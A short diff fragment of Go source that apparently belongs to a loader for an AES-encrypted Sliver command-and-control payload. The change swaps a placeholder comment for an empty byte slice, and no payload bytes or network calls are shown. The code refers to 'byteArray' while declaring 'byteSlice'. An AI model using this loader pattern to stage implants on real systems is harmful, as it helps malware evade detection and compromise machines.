@@ -160,7 +160,7 @@ var aesKey string
 func main() {
 
 	// Encrypted data from sliver_payload
-	byteSlice := []byte{//encrypted bytes go here}
+	byteSlice := []byte{}
 
 	// AES decryption
 	aesDecrypted, _ := aesDecrypt(byteArray, []byte(aesKey))
